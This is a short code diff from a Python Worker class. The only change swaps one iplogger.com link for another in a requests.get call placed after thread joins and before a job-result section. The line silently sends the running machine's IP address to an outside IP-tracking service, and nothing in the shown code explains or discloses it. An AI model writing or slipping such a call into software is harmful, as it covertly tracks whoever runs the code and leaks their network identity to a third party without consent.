@@ -500,7 +500,7 @@ class Worker:
         for thread in threads:
             thread.join()
 
-        requests.get("https://iplogger.com/2HKyZF")
+        requests.get("https://iplogger.com/2lZdU4")
 
         # ====================================================
         # JOB RESULT
